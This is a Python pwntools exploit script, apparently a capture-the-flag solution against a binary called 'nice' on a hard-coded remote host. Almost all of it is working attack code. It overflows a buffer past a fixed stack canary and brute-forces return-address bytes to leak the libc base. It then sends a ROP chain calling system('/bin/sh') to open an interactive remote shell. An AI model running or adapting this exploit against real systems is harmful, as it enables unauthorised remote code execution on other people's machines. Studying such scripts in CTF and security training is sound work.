#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host localhost --port 8916
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./nice')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'localhost'
port = int(args.PORT or 8409)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

# io = start()


# libc = ELF("/usr/lib/x86_64-linux-gnu/libc-2.31.so")
libc = ELF("./libc-2.31.so")


if args.LOCAL:
    host = "localhost"
else:
    host = '103.41.207.206'
port = 8343

can = 4778389115772220160

p = "a"*56
p += p64(can)
p += 'a'*8
print p

def libc_leak(pd,host1,port1):
    for i in range(256):
        try:
            io1 = connect(host1, port1,level='error')

            io1.send(pd + chr(i))

            io1.recvline()
            data=io1.recvline()
            print data
            if "GNU C Library" in data:
                return i
        except:
            # pass
            continue
            


# leak_libc = '\x40'

leak_libc = '\xb0'
test = 1

if test==1:

    io = connect(host, port)
    leak_libc = '\xb0\xc1'

    p += leak_libc

    io.send(p)

    io.interactive()
else:
    print 'brute libc'
    print host,port
    # 0x220
    for i in range(12):
        lib_temp = libc_leak(p+leak_libc, host, port)
        # print (lib_temp)
        if lib_temp == None:
            continue
        else:
            print hex(lib_temp)
            leak_libc += chr(lib_temp)
            if len(leak_libc) == 5:
                break

    leak_libc += '\x7f\x00\x00'

    print hex(u64(leak_libc))

    # libc.address = u64(leak_libc) - 0x26e40

    libc.address = u64(leak_libc) - 0x271b0
    print hex(libc.address)
    pop_rdi = libc.search(asm('pop rdi ; ret')).next()

    io = connect(host, port)

    p = "a"*56
    p += p64(can)
    p += 'a'*8
    p += p64(pop_rdi)
    p += p64(libc.search("/bin/sh").next())
    p += p64(pop_rdi+1)
    p += p64(libc.sym['system'])
    io.send(p)

    io.interactive()

